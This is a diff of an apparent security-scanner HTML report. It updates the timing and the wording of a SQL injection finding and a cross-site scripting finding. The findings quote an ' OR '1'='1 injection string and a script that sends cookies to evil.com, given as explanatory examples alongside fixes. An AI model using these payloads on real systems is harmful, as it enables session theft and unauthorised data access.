@@ -61,8 +61,8 @@
             <div class="stats">
                 <div class="stat">📍 Routes: 8</div>
                 <div class="stat">🔍 Issues: 12</div>
-                <div class="stat">⏱️ Time: 1.023s</div>
-                <div class="stat">📅 2026-11-13 20:26</div>
+                <div class="stat">⏱️ Time: 0.992s</div>
+                <div class="stat">📅 2026-11-13 23:00</div>
             </div>
         </div>
 
@@ -106,15 +106,15 @@
                         font-family:monospace;font-size:0.9em;margin:8px 0;">
                 query = f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27; AND password = &#x27;{password}&#x27;&quot;
             </div>
-            <p><strong>⚠️ Why:</strong> Variable &#x27;username&#x27; appears to come from user input and is interpolated directly into a SQL query string. An attacker can send input like `&#x27; OR &#x27;1&#x27;=&#x27;1` to manipulate the query, potentially accessing or deleting all data.</p>
+            <p><strong>⚠️ Why:</strong> Variable &#x27;password&#x27; appears to come from user input and is interpolated directly into a SQL query string. An attacker can send input like `&#x27; OR &#x27;1&#x27;=&#x27;1` to manipulate the query, potentially accessing or deleting all data.</p>
             <p><strong>✅ Fix:</strong> Use parameterized queries instead of string interpolation.</p>
             
             <div style="margin-top:8px;">
                 <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
-                    <strong>Before:</strong> <code>cursor.execute(f&quot;SELECT ... WHERE col = {username}&quot;)</code>
+                    <strong>Before:</strong> <code>cursor.execute(f&quot;SELECT ... WHERE col = {password}&quot;)</code>
                 </div>
                 <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
-                    <strong>After:</strong> <code>cursor.execute(&quot;SELECT ... WHERE col = %s&quot;, (username,))</code>
+                    <strong>After:</strong> <code>cursor.execute(&quot;SELECT ... WHERE col = %s&quot;, (password,))</code>
                 </div>
             </div>
             <p>📖 <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP Reference</a></p>
@@ -174,7 +174,7 @@
                         font-family:monospace;font-size:0.9em;margin:8px 0;">
                 return render_template_string(tmpl)
             </div>
-            <p><strong>⚠️ Why:</strong> Variable &#x27;tmpl&#x27; appears to contain user input that is included in HTML output without escaping (render_template_string with user input variable). An attacker can inject &#x27;&lt;script&gt;document.location=&quot;http://evil.com/?c=&quot;+document.cookie&lt;/script&gt;&#x27; to steal cookies.</p>
+            <p><strong>⚠️ Why:</strong> Variable &#x27;tmpl&#x27; appears to contain user input that is included in HTML output without escaping (render_template_string with user input). An attacker can inject &#x27;&lt;script&gt;document.location=&quot;http://evil.com/?c=&quot;+document.cookie&lt;/script&gt;&#x27; to steal cookies.</p>
             <p><strong>✅ Fix:</strong> Escape all user input before including in HTML.</p>
             
             <div style="margin-top:8px;">
